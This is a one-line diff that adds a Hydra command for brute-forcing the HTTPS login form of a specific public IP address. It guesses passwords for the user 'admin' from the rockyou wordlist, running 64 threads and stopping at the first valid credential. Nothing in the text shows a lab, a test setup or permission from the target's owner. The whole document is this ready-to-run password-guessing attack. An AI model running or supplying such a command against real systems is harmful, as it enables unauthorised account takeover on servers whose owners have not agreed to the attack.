@@ -1,0 +1,1 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 52.42.247.236 http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" -s 443 -S -V -t 64 -f
